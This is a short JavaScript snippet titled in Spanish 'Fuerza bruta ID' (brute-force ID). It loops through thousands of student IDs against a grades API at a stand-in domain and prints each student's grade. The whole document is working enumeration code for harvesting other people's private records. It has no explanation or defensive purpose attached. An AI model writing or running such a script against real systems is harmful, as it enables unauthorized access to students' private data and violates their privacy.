Fuerza bruta ID
```js
import axios from 'axios'

for (let id = 1111; id < 9999; id++) {
	axios
		.get('http://api.grades.example.com/grades?subjectid=1293&studentid=2022' + id)
		.then(res => {
			console.log("Student: 2022" + id + ", Grade: " + res.data.grade)
		})
		.catch(error => {
			console.error(error)
		}
	)
}
```